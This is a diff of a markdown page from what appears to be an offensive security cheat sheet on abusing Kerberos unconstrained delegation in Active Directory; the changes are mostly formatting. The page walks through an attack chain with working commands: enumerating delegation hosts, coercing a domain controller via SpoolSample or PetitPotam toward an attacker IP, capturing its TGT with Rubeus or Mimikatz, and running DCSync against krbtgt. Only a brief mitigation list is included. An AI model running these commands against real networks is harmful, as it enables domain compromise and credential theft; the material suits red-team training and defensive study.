@@ -1,8 +1,7 @@
 # Kerberos Delegation - Unconstrained Delegation
 
-> The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 
-
-> When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. 
+> The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user.
+> When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory.
 
 :warning: Unconstrained delegation used to be the only option available in Windows 2000
 
@@ -14,41 +13,46 @@
 The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.
 
 **Requirements**:
+
 - Object with Property **Trust this computer for delegation to any service (Kerberos only)**
-- Must have **ADS_UF_TRUSTED_FOR_DELEGATION** 
+- Must have **ADS_UF_TRUSTED_FOR_DELEGATION**
 - Must not have **ADS_UF_NOT_DELEGATED** flag
-- User must not be in the **Protected Users** group 
+- User must not be in the **Protected Users** group
 - User must not have the flag **Account is sensitive and cannot be delegated**
 
 ### Find delegation
 
-:warning: : Domain controllers usually have unconstrained delegation enabled.    
+:warning: : Domain controllers usually have unconstrained delegation enabled.
 Check the `TRUSTED_FOR_DELEGATION` property.
 
-* [ADModule](https://github.com/samratashok/ADModule)
+- [ADModule](https://github.com/samratashok/ADModule)
+
   ```powershell
   # From https://github.com/samratashok/ADModule
   PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
   ```
-* [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
   ```ps1
   bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' --attr sAMAccountName,userAccountControl
   ```
   
-* [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
+- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
+
   ```powershell
   $> ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10   
   grep TRUSTED_FOR_DELEGATION domain_computers.grep
   ```
 
-* [netexec module](https://github.com/Pennyw0rth/NetExec/wiki) 
+- [netexec module](https://github.com/Pennyw0rth/NetExec/wiki)
+
   ```powershell
   nxc ldap 10.10.10.10 -u username -p password --trusted-for-delegation
   ```
 
-* BloodHound: `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
-* Powershell Active Directory module: `Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl`
-
+- BloodHound: `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
+- Powershell Active Directory module: `Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl`
 
 ### SpoolService status
 
@@ -71,7 +75,7 @@ Rubeus.exe monitor /interval:1
 
 Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.
 
->  SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.
+> SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.
 
 ```powershell
 # From https://github.com/leechristensen/SpoolSample
@@ -101,12 +105,10 @@ Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekur
 
 Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`
 
-
 ### Mitigation
 
-* Ensure sensitive accounts cannot be delegated
-* Disable the Print Spooler Service
-
+- Ensure sensitive accounts cannot be delegated
+- Disable the Print Spooler Service
 
 ## MS-EFSRPC Abuse with Unconstrained Delegation
 
@@ -122,8 +124,8 @@ python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
 .\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
 ```
 
-
 ## References
 
-* [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
-* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+- [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
+- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - Elad Shamir - 28 January 2019](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
